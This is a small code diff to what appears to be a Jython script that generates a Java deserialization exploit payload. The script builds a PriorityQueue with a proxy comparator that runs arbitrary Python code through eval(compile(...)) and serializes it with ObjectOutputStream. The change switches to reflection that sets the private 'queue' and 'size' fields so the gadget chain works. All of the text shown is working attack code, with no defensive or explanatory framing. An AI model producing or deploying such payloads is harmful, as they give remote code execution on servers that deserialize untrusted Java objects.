@@ -1,6 +1,3 @@
-from org.python.core import Options
-Options.respectJavaAccessibility = False
-
 from org.python.core import PyMethod
 from java.lang import Object
 from java.io import BufferedOutputStream, ObjectOutputStream, FileOutputStream
@@ -22,8 +19,9 @@ codeWrap = 'eval(compile(' + incodestr + ', "", "exec")) or 0'
 comparator = Proxy.newProxyInstance(Comparator.getClassLoader(), [Comparator], handler)
 
 priorityQueue = PriorityQueue(2, comparator)
-priorityQueue.queue = array(Object, [codeWrap, {}])
-# respectJavaAccessibility doesn't help us when size the field overlaps with size() the method...
+queueField = PriorityQueue.getDeclaredField("queue")
+queueField.setAccessible(True)
+queueField.set(priorityQueue, array(Object, [codeWrap, {}]))
 sizeField = PriorityQueue.getDeclaredField("size")
 sizeField.setAccessible(True)
 sizeField.set(priorityQueue, 2)
